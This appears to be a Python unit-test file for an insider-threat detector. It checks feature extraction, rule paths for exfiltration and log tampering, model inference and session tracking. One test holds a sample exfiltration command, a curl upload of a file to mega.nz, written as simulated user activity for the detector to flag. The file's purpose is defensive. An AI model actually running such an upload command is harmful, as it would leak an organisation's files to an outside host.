"""
Unit tests for the AdaptiveShield Insider Module.

Tests feature extraction, rule-based fallback decision paths,
inference engine behavior, feedback recording, and the
AdaptiveInsiderDetector runtime bridge.
"""

import os
import csv
import pytest
from unittest.mock import MagicMock
import numpy as np

from agents.insider.internal_insider_dataset import (
    FEATURE_COLUMNS,
    extract_features,
    determine_label,
)
from agents.insider.internal_insider_inference import (
    predict_session_risk,
    record_live_feedback,
)
from interfaces.insider_contract import UserBehaviorSignal


class TestInsiderFeatureExtraction:
    """Test 35-feature vector extraction and normalization."""

    def test_feature_columns_count(self):
        assert len(FEATURE_COLUMNS) == 35, f"Expected 35 feature columns, got {len(FEATURE_COLUMNS)}"

    def test_role_admin_parsing(self):
        for role_str in ["admin", "devops", "sre", "sysadmin", "infrastructure_lead"]:
            feats = extract_features({"role": role_str})
            assert feats["role_admin"] == 1.0, f"Role '{role_str}' should map to role_admin=1.0"
            assert feats["role_developer"] == 0.0
            assert feats["role_normal"] == 0.0

    def test_role_developer_parsing(self):
        for role_str in ["developer", "software_engineer", "ai_scientist", "ml_engineer", "programmer"]:
            feats = extract_features({"role": role_str})
            assert feats["role_developer"] == 1.0, f"Role '{role_str}' should map to role_developer=1.0"
            assert feats["role_admin"] == 0.0
            assert feats["role_normal"] == 0.0

    def test_role_finance_parsing(self):
        for role_str in ["finance", "accountant", "payroll_specialist", "billing_analyst"]:
            feats = extract_features({"role": role_str})
            assert feats["role_finance"] == 1.0, f"Role '{role_str}' should map to role_finance=1.0"
            assert feats["role_normal"] == 0.0

    def test_role_hr_parsing(self):
        for role_str in ["hr", "personnel", "people_ops", "recruiting_lead", "talent"]:
            feats = extract_features({"role": role_str})
            assert feats["role_hr"] == 1.0, f"Role '{role_str}' should map to role_hr=1.0"
            assert feats["role_normal"] == 0.0

    def test_role_normal_fallback(self):
        for role_str in ["sales", "marketing", "guest", "contractor_external", "unknown"]:
            feats = extract_features({"role": role_str})
            assert feats["role_normal"] == 1.0, f"Role '{role_str}' should map to role_normal=1.0"
            assert feats["role_admin"] == 0.0
            assert feats["role_developer"] == 0.0

    def test_command_density_zero_duration_guard(self):
        feats = extract_features({"commands": ["ls", "pwd"], "duration_sec": 0})
        assert feats["command_density"] == 0.0
        assert feats["command_count"] == 2.0

    def test_command_density_calculation(self):
        feats = extract_features({"command_count": 100, "duration_sec": 200})
        assert pytest.approx(feats["command_density"], 1e-4) == 0.5

    def test_calculated_risk_score_bounding(self):
        # Trigger all violation weights to exceed 100
        extreme_session = {
            "access_unauthorized_scope": 1,
            "access_sensitive_dirs": 1,
            "usb_write_count": 5,
            "cloud_upload_count": 10,
            "log_deletion_attempt": 1,
            "syslog_stop_attempt": 1,
            "sudoers_modification": 1,
            "failed_sudo_count": 5,
            "suspicious_process_spawned": 1,
            "work_after_hours": 1,
            "unusual_login_time": 1,
        }
        feats = extract_features(extreme_session)
        assert feats["calculated_risk_score"] == 100.0, "Calculated risk score must be capped at 100.0"

    def test_behavior_deviation_default(self):
        feats = extract_features({"access_sensitive_dirs": 1})
        expected_dev = feats["calculated_risk_score"] / 100.0
        assert pytest.approx(feats["behavior_deviation_score"], 1e-4) == expected_dev


class TestRuleFallbackLogic:
    """Test the 7 deterministic decision paths in determine_label."""

    def test_path_1_explicit_label(self):
        feats = extract_features({})
        label, reason = determine_label(feats, explicit_label=1)
        assert label == 1
        assert "Path 1" in reason

    def test_path_2_exfiltration_and_log_tampering(self):
        feats = extract_features({
            "cloud_upload_count": 3,
            "log_deletion_attempt": 1,
        })
        label, reason = determine_label(feats)
        assert label == 1
        assert "Path 2" in reason

    def test_path_3_log_tampering_and_privilege_abuse(self):
        feats = extract_features({
            "syslog_stop_attempt": 1,
            "failed_sudo_count": 4,
        })
        label, reason = determine_label(feats)
        assert label == 1
        assert "Path 3" in reason

    def test_path_4_privilege_escalation_and_unauthorized_scope(self):
        feats = extract_features({
            "sudoers_modification": 1,
            "access_unauthorized_scope": 1,
        })
        label, reason = determine_label(feats)
        assert label == 1
        assert "Path 4" in reason

    def test_path_5_credential_anomaly_off_hours(self):
        feats = extract_features({
            "credential_sharing_indicators": 1,
            "work_after_hours": 1,
        })
        label, reason = determine_label(feats)
        assert label == 1
        assert "Path 5" in reason

    def test_path_6_unauthorized_scope_exfiltration(self):
        feats = extract_features({
            "access_unauthorized_scope": 1,
            "usb_write_count": 2,
        })
        label, reason = determine_label(feats)
        assert label == 1
        assert "Path 6" in reason

    def test_path_7_high_calculated_risk(self):
        # unusual_pc_login=40 + cloud_upload_count=25 = 65 >= 60 threshold
        # This combo doesn't trigger earlier paths (no log tampering, no
        # privilege escalation, no credential_sharing, not after hours).
        feats = extract_features({
            "unusual_pc_login": 1,            # 40
            "cloud_upload_count": 1,          # 25
        })
        label, reason = determine_label(feats)
        assert label == 1
        assert "Path 7" in reason

    def test_default_normal_verdict(self):
        feats = extract_features({
            "role": "developer",
            "access_intellectual_property": 1,
            "command_count": 50,
            "duration_sec": 28800,
        })
        label, reason = determine_label(feats)
        assert label == 0
        assert "Normal session behavior" in reason


class TestInferenceEngine:
    """Test predict_session_risk and live feedback recording."""

    def test_fallback_when_model_is_none(self):
        session = {
            "session_id": "test_fallback_01",
            "role": "developer",
            "cloud_upload_count": 5,
            "log_deletion_attempt": 1,
        }
        pred = predict_session_risk(session, model_bundle=None)
        assert pred["session_id"] == "test_fallback_01"
        assert pred["label"] == "MALICIOUS_INSIDER"
        assert any("Fallback Rule verdict" in exp for exp in pred["explanation"])
        assert "features" in pred
        assert len(pred["features"]) == 35

    def test_mock_model_bundle_inference(self):
        mock_model = MagicMock()
        mock_model.predict_proba.return_value = np.array([[0.1, 0.9]])
        mock_scaler = MagicMock()
        mock_scaler.transform.return_value = np.zeros((1, 35))

        mock_bundle = {
            "model": mock_model,
            "scaler": mock_scaler,
            "feature_names": FEATURE_COLUMNS,
        }

        session = {"session_id": "mock_test_01", "role": "admin"}
        pred = predict_session_risk(session, model_bundle=mock_bundle)
        assert pred["label"] == "MALICIOUS_INSIDER"
        assert pred["risk_score"] == 90.0
        assert mock_model.predict_proba.called
        assert mock_scaler.transform.called

    def test_record_live_feedback_schema(self, tmp_path):
        test_csv = tmp_path / "test_live.csv"
        session = {
            "session_id": "sess_feedback_01",
            "role": "developer",
            "usb_mount_attempt": 1,
            "usb_write_count": 2,
        }
        record_live_feedback(
            session=session,
            true_label=1,
            feedback_reason="Analyst verified thumb drive leak",
            csv_path=str(test_csv),
        )

        assert test_csv.exists()
        with open(test_csv, "r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            rows = list(reader)
            assert len(rows) == 1
            row = rows[0]
            assert row["session_id"] == "sess_feedback_01"
            assert row["label"] == "1"
            assert "Analyst verified" in row["label_reason"]
            for col in FEATURE_COLUMNS:
                assert col in row


class TestAdaptiveInsiderDetectorUnit:
    """Test AdaptiveInsiderDetector state management and scope rules."""

    def test_signal_state_accumulation(self):
        from agents.insider.insider_adapter import AdaptiveInsiderDetector
        detector = AdaptiveInsiderDetector(model_path="nonexistent_model.pkl")

        sig1 = UserBehaviorSignal(
            user_id="alice",
            session_id="sess_accum_01",
            timestamp="2026-10-04 10:00:00",
            source_ip="192.168.1.50",
            is_internal=True,
            action_type="command",
            action_details={"role": "developer", "command": "git status"},
        )
        detector.analyze_signal(sig1)

        sig2 = UserBehaviorSignal(
            user_id="alice",
            session_id="sess_accum_01",
            timestamp="2026-10-04 10:05:00",
            source_ip="192.168.1.50",
            is_internal=True,
            action_type="command",
            action_details={"role": "developer", "command": "curl -F file=@data mega.nz/upload", "cloud_upload": True},
        )
        detector.analyze_signal(sig2)

        state = detector.session_states["sess_accum_01"]
        assert len(state["commands"]) == 2
        assert state["cloud_upload_count"] == 1
        assert state["duration_sec"] == 300.0  # 5 minutes difference

    def test_reset_session_state(self):
        from agents.insider.insider_adapter import AdaptiveInsiderDetector
        detector = AdaptiveInsiderDetector(model_path="nonexistent_model.pkl")

        sig = UserBehaviorSignal(
            user_id="bob",
            session_id="sess_reset_01",
            timestamp="2026-10-04 12:00:00",
            source_ip="192.168.1.60",
            is_internal=True,
            action_type="http_request",
            action_details={"role": "normal"},
        )
        detector.analyze_signal(sig)
        assert "sess_reset_01" in detector.session_states

        detector.reset_session_state("sess_reset_01")
        assert "sess_reset_01" not in detector.session_states
